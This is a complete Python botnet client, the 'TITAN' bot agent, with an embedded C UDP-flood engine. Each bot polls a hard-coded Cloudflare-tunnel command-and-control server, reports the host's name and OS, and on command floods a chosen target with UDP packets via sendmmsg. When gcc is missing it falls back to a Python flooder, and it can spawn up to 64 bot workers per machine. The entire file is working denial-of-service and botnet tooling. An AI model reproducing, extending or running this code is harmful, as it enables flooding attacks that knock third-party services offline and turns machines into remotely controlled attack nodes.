#!/usr/bin/env python3
"""
  ENI & LO — TITAN MULTI-PROCESS BOT AGENT v3.0 (2026)
  =====================================================
  Single command spawns N bot workers, each with its own
  sendmmsg C-engine. Maximizes every drop of bandwidth.

  Usage:
    python3 bot_client.py                          # 1 bot (default)
    python3 bot_client.py 4                        # 4 bots on this machine
    python3 bot_client.py 4 custom.trycloudflare.com 443
"""

import socket, json, threading, time, urllib.request, platform
import sys, multiprocessing, random, string, os, subprocess, signal

if os.name == 'nt':
    os.system('color')

# ============================================================================
#  CONFIG — CHANGE THESE
# ============================================================================
DEFAULT_C2   = "come-spectacular-northern-vip.trycloudflare.com"
DEFAULT_PORT = 443
CPU_CORES    = multiprocessing.cpu_count()

# ============================================================================
#  TITAN sendmmsg C-ENGINE (compiled once, reused by all bots)
# ============================================================================
C_ENGINE = r"""
#define _GNU_SOURCE
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>

#define BATCH   1024
#define PKTSIZE 1400

static volatile int g_running = 1;
static char g_ip[64];
static int  g_port;
static unsigned long long g_pkts = 0;
static unsigned long long g_bytes = 0;

void handle_sig(int s) { g_running = 0; }

void* telemetry(void* arg) {
    unsigned long long lp = 0, lb = 0;
    while (g_running) {
        sleep(1);
        unsigned long long cp = __atomic_load_n(&g_pkts,  __ATOMIC_RELAXED);
        unsigned long long cb = __atomic_load_n(&g_bytes, __ATOMIC_RELAXED);
        unsigned long long dp = cp - lp;
        unsigned long long db = cb - lb;
        double mbps = (db * 8.0) / (1024.0 * 1024.0);
        double gbps = mbps / 1024.0;
        if (gbps >= 1.0)
            printf("\033[92m[TITAN KERNEL STREAM]\033[0m Sent: \033[97m%llu\033[0m pkts | Speed: \033[93m%llu PPS\033[0m (\033[96m%.2f Gbps\033[0m) | Vector: \033[95mUDP-sendmmsg\033[0m\n", cp, dp, gbps);
        else
            printf("\033[92m[TITAN KERNEL STREAM]\033[0m Sent: \033[97m%llu\033[0m pkts | Speed: \033[93m%llu PPS\033[0m (\033[96m%.2f Mbps\033[0m) | Vector: \033[95mUDP-sendmmsg\033[0m\n", cp, dp, mbps);
        fflush(stdout);
        lp = cp; lb = cb;
    }
    return NULL;
}

void* worker(void* arg) {
    int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (fd < 0) return NULL;

    int val = 0;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &val, sizeof(val));

    struct sockaddr_in dst = {0};
    dst.sin_family = AF_INET;
    dst.sin_port   = htons(g_port);
    inet_pton(AF_INET, g_ip, &dst.sin_addr);

    char buf[PKTSIZE];
    memset(buf, 'A', PKTSIZE);

    struct iovec   iov[BATCH];
    struct mmsghdr msg[BATCH];
    for (int i = 0; i < BATCH; i++) {
        iov[i].iov_base         = buf;
        iov[i].iov_len          = PKTSIZE;
        memset(&msg[i], 0, sizeof(msg[i]));
        msg[i].msg_hdr.msg_name    = &dst;
        msg[i].msg_hdr.msg_namelen = sizeof(dst);
        msg[i].msg_hdr.msg_iov     = &iov[i];
        msg[i].msg_hdr.msg_iovlen  = 1;
    }

    while (g_running) {
        int r = sendmmsg(fd, msg, BATCH, 0);
        if (r > 0) {
            __atomic_fetch_add(&g_pkts,  r,          __ATOMIC_RELAXED);
            __atomic_fetch_add(&g_bytes, r * PKTSIZE, __ATOMIC_RELAXED);
        }
    }
    close(fd);
    return NULL;
}

int main(int argc, char** argv) {
    if (argc < 4) { fprintf(stderr, "Usage: %s <ip> <port> <threads>\n", argv[0]); return 1; }
    strncpy(g_ip, argv[1], sizeof(g_ip)-1);
    g_port = atoi(argv[2]);
    int nth = atoi(argv[3]);
    if (nth < 1) nth = 4;
    if (nth > 256) nth = 256;

    signal(SIGTERM, handle_sig);
    signal(SIGINT,  handle_sig);

    pthread_t mon;
    pthread_create(&mon, NULL, telemetry, NULL);

    pthread_t thr[256];
    for (int i = 0; i < nth; i++)
        pthread_create(&thr[i], NULL, worker, NULL);
    for (int i = 0; i < nth; i++)
        pthread_join(thr[i], NULL);

    g_running = 0;
    pthread_join(mon, NULL);
    return 0;
}
"""

# ============================================================================
#  C-ENGINE COMPILER (runs once per machine)
# ============================================================================
ENGINE_BIN = None

def ensure_engine():
    global ENGINE_BIN
    if platform.system() != "Linux":
        return None
    binpath = os.path.join(os.getcwd(), "titan_engine")
    if os.path.isfile(binpath) and os.access(binpath, os.X_OK):
        ENGINE_BIN = binpath
        return binpath
    srcpath = os.path.join(os.getcwd(), "titan_engine.c")
    with open(srcpath, "w") as f:
        f.write(C_ENGINE)
    r = subprocess.run(["gcc", "-O3", "-march=native", srcpath, "-o", binpath, "-lpthread"],
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if r.returncode == 0 and os.path.isfile(binpath):
        os.chmod(binpath, 0o755)
        print("\033[92m[+] TITAN C-Engine compiled (gcc -O3 -march=native)\033[0m")
        ENGINE_BIN = binpath
        return binpath
    print(f"\033[91m[-] C-Engine compile failed, falling back to Python UDP\033[0m")
    return None

# ============================================================================
#  PYTHON FALLBACK FLOODER (when gcc not available)
# ============================================================================
g_atk    = False
g_atkid  = None
g_pkts   = 0
g_bytes  = 0
g_errs   = 0
g_proc   = None

def py_udp(target, port, dur, atkid):
    global g_atk, g_atkid, g_pkts, g_bytes, g_errs
    end = time.time() + dur
    pld = os.urandom(1400)
    plen = len(pld)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except:
        return
    while g_atk and g_atkid == atkid and time.time() < end:
        try:
            for _ in range(256):
                s.sendto(pld, (target, port))
            g_pkts  += 256
            g_bytes += plen * 256
        except:
            g_errs += 1
    try: s.close()
    except: pass

def py_telemetry(target, port, vec, atkid):
    global g_pkts, g_bytes, g_errs, g_atk, g_atkid
    lp = lb = 0; lt = time.time()
    print(f"\n\033[96m[PYTHON TELEMETRY]\033[0m {target}:{port}\n")
    while g_atk and g_atkid == atkid:
        time.sleep(1)
        now = time.time(); dt = now - lt
        if dt <= 0: continue
        cp, cb, ce = g_pkts, g_bytes, g_errs
        pps = int((cp - lp) / dt)
        mbps = ((cb - lb) * 8) / (dt * 1024 * 1024)
        gbps = mbps / 1024
        lp, lb, lt = cp, cb, now
        spd = f"{gbps:.2f} Gbps" if gbps >= 1 else f"{mbps:.2f} Mbps"
        print(f"\033[92m[FLOOD STREAM]\033[0m Sent: \033[97m{cp:,}\033[0m | \033[93m{pps:,} PPS\033[0m (\033[96m{spd}\033[0m) | Err: \033[91m{ce}\033[0m | \033[95m{vec}\033[0m")

# ============================================================================
#  ATTACK CONTROL
# ============================================================================
def stop():
    global g_atk, g_atkid, g_proc
    g_atk = False; g_atkid = None
    if g_proc:
        try: g_proc.terminate(); g_proc.kill()
        except: pass
        g_proc = None
    print("\033[91m[*] Attack stopped.\033[0m")

def fire(target, port, dur, threads, atkid, vec="UDP"):
    global g_atk, g_atkid, g_pkts, g_bytes, g_errs, g_proc
    if g_atkid == atkid and g_atk:
        return
    stop()
    g_atkid = atkid; g_pkts = 0; g_bytes = 0; g_errs = 0; g_atk = True
    th = max(threads, CPU_CORES)

    print(f"\n\033[91m[🚀 TITAN LAUNCH]\033[0m {vec} -> \033[97m{target}:{port}\033[0m | {dur}s | {th} threads")

    eng = ensure_engine() if vec == "UDP" else None

    if eng:
        print(f"\033[92m[⚡ C-ENGINE ACTIVE — sendmmsg kernel blast]\033[0m")
        try:
            g_proc = subprocess.Popen([eng, target, str(port), str(th)],
                                      stdout=sys.stdout, stderr=sys.stderr)
        except Exception as e:
            print(f"\033[91m[!] C-Engine spawn error: {e}\033[0m"); eng = None

    if not eng:
        fn = py_udp
        for _ in range(th):
            threading.Thread(target=fn, args=(target, port, dur, atkid), daemon=True).start()
        threading.Thread(target=py_telemetry, args=(target, port, vec, atkid), daemon=True).start()

    def cleanup():
        time.sleep(dur)
        global g_atk, g_atkid, g_proc
        if g_atkid == atkid:
            g_atk = False; g_atkid = None
            if g_proc:
                try: g_proc.terminate(); g_proc.kill()
                except: pass
                g_proc = None
            print(f"\n\033[92m[✓] Attack {atkid} finished.\033[0m\n")
    threading.Thread(target=cleanup, args=(), daemon=True).start()

# ============================================================================
#  SINGLE BOT WORKER (runs in its own process)
# ============================================================================
def bot_worker(worker_id, c2_host, c2_port):
    bid = f"BOT-{platform.node()}-{worker_id}-{random.randint(10000,99999)}"
    proto = "https" if c2_port == 443 else "http"
    base  = f"{proto}://{c2_host}" if c2_port in (80,443) else f"{proto}://{c2_host}:{c2_port}"
    poll  = f"{base}/poll"

    print(f"\033[96m[Worker-{worker_id}]\033[0m Bot \033[92m{bid}\033[0m polling \033[93m{poll}\033[0m")

    connected = False
    last_atkid = None

    while True:
        try:
            body = json.dumps({
                "bot_id": bid,
                "hostname": platform.node(),
                "os": f"{platform.system()} {platform.release()}"
            }).encode()
            req = urllib.request.Request(poll, data=body, headers={"Content-Type":"application/json"})
            with urllib.request.urlopen(req, timeout=4) as resp:
                if not connected:
                    print(f"\033[92m[Worker-{worker_id}] CONNECTED as {bid}\033[0m")
                    connected = True
                raw = resp.read().decode()
                cmd = json.loads(raw) if raw else {}
                act = cmd.get("action")
                aid = cmd.get("attack_id")

                if act == "ATTACK" and aid and aid != last_atkid:
                    last_atkid = aid
                    fire(
                        cmd.get("target"),
                        int(cmd.get("port", 80)),
                        int(cmd.get("duration", 60)),
                        int(cmd.get("threads", 128)),
                        aid,
                        cmd.get("vector", "UDP")
                    )
                elif act in ("STOP", "IDLE"):
                    if g_atk:
                        stop()
                        last_atkid = None
        except:
            pass
        time.sleep(0.5)

# ============================================================================
#  MAIN — spawn N bot workers
# ============================================================================
def main():
    # Parse args:  bot_client.py [bot_count] [c2_host] [c2_port]
    args   = sys.argv[1:]
    count  = 1
    host   = DEFAULT_C2
    port   = DEFAULT_PORT

    # Figure out what was passed
    for a in args:
        if a.isdigit() and int(a) <= 64:
            count = int(a)
        elif a.isdigit():
            port = int(a)
        elif "." in a or "trycloudflare" in a:
            host = a

    # If port is in remaining args
    if len(args) >= 3:
        host  = args[1] if not args[1].isdigit() or int(args[1]) > 64 else host
        port  = int(args[2]) if len(args) > 2 and args[2].isdigit() else port
    elif len(args) == 2:
        if "." in args[0] or "trycloudflare" in args[0]:
            host = args[0]
            port = int(args[1]) if args[1].isdigit() else port
        elif args[0].isdigit() and int(args[0]) <= 64:
            count = int(args[0])
            host  = args[1] if "." in args[1] else host

    print(f"\033[96m{'='*72}\033[0m")
    print(f"\033[96m  ENI & LO — TITAN MULTI-BOT AGENT v3.0 (2026)\033[0m")
    print(f"\033[96m{'='*72}\033[0m")
    print(f"  C2 Endpoint : \033[93mhttps://{host}\033[0m")
    print(f"  Bot Count   : \033[92m{count}\033[0m")
    print(f"  CPU Cores   : \033[97m{CPU_CORES}\033[0m")
    print(f"  OS          : \033[97m{platform.system()} {platform.release()}\033[0m")
    print(f"\033[96m{'='*72}\033[0m\n")

    # Pre-compile C engine once before forking
    ensure_engine()

    if count == 1:
        bot_worker(1, host, port)
    else:
        procs = []
        for i in range(count):
            p = multiprocessing.Process(target=bot_worker, args=(i+1, host, port), daemon=True)
            p.start()
            procs.append(p)
            print(f"\033[92m[+] Spawned bot worker {i+1}/{count} (PID {p.pid})\033[0m")
            time.sleep(0.3)

        print(f"\n\033[92m[✓] All {count} bot workers active. Press Ctrl+C to stop.\033[0m\n")
        try:
            while True:
                time.sleep(60)
        except KeyboardInterrupt:
            print("\n\033[91m[!] Shutting down all workers...\033[0m")
            for p in procs:
                p.terminate()

if __name__ == "__main__":
    main()
